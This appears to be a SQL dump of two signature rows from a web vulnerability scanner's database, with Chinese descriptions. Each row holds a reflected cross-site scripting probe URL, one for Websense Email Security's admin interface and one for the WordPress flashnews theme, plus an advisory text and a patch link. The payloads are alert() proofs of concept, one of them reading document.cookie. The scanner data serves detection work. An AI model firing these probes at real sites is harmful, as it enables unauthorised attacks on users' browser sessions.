INSERT INTO `cgidb` VALUES ('7329', null, '跨站脚本攻击', '/web/msgList/viewmsg/actions/msgAnalyse.asp?Queue=Network%20Security&FileName=[XSS]&IsolatedMessageID=[XSS]&ServerName=[XSS]&Dictionary=[XSS]&Scoring=[XSS]&MessagePart=\"><script>alert(4444)</script>', 'GET', '<script>alert(4444)</script>#nvs_test#', '2', null, null, null, null, 'Websense Email Security是综合的邮件安全软件，对邮件和Web 2.0的混合威胁提供防护。\r\n\r\nWebsense Email Security默认监听于TCP/8181端口上的Web Administrator管理前端没有正确地过滤某些变量便返回给了用户，远程攻击者可以通过提交恶意的HTTP请求执行跨站脚本攻击；此外没有正确地过滤邮件的Subject字段便在Web Administrator前端显示，远程攻击者可以在标题中注入类似于\"><script>alert(\'X\')</script>的脚本代码在用户浏览器会话中执行。', null, null, '1', '7085', '补丁：http://tinyurl.com/yhe3hqa');
INSERT INTO `cgidb` VALUES ('7330', null, '跨站脚本攻击', '/wp-content/themes/flashnews/thumb.php?src=%3Cbody%20onload=/wp-content/themes/flashnews/thumb.php?src=%3Cbody%20onload=alert(document.cookie)%3E.jpg/wp-content/themes/flashnews/thumb.php?src=%3Cbody%20onload=alert(document.cookie)%3E.jpg%3E.jpg', 'GET', 'alert(document.cookie)>#nvs_test#', '2', null, null, null, null, 'WordPress flashnews可在网站上显示闪讯。\r\n\r\nWordPress的flashnews主题没有正确验证thumb.php内的多个参数值，可导致拒绝服务、信息泄露、上传任意文件到受影响计算机，在受影响站点的用户浏览器中执行任意代码等。', null, null, '1', '7086', '补丁：http://wordpress.org/extend/plugins/tags/flash-news');
